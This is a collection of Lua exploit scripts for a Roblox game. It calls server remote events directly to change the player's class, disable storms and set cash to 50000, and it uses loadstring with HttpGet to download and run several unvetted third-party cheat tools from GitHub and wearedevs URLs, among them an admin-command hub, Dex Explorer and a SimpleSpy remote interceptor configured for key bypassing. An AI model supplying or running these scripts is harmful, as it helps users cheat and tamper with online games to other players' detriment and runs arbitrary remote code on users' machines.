-- Select classAdd commentMore actions
local args = { [1] = "Builder" }
game:GetService("ReplicatedStorage").SelectedClass:FireServer(unpack(args))
-
-- Return to lobby
game:GetService("ReplicatedStorage").ReturnToLobby:FireServer()
-
-- Disable storms
game:GetService("ReplicatedStorage").StormDisable:FireServer()
-
-- Infinite Yield (Admin Commands)More actions
loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
-
-- Dex Explorer
loadstring(game:HttpGet("https://raw.githubusercontent.com/BigBoyTimme/New.Loadstring.Scripts/refs/heads/main/Dex.Explorer", true))()
-
-- Fly script
loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Fly.txt", true))()
-
-- FE Exploit Hub


loadstring(game:HttpGet("https://raw.githubusercontent.com/ButterHub/ButterHub/main/ButterHubSource.lua"), true)()

-- Cash exploit soon!
-- Cash exploit (dont know if it works):
local args = {
    [1] = 50000
}

game:GetService("ReplicatedStorage").CashValueChanged:FireServer(unpack(args))


-- Simple spy, Request scripts u find on the request tab

local settings = {
    SaveDecompileLogs = false, -- saves decompile logs so you dont have to decompile again
    SaveScanLogs = false, -- saves scan logs (scans for localscript to decompile) so you dont have to scan again
    ScanForNewInstance = true, -- scans for new localscript and decompile it and add it to the decompile logs
    InterceptUntilRan = true, -- blocks request until you manually run it (i recommend when bypassing keys)
    CursorOffset = -15, -- Cursor offset
    PathToDump = {game.Players.LocalPlayer, game:GetService('ReplicatedStorage')} -- path to dump

}

--// Init

_G.data = settings
loadstring(game:HttpGet('https://raw.githubusercontent.com/Snxdfer/SimpleSpy-Lite-Xeno-Solara-/refs/heads/main/SimpleSpyLite.lua'))()
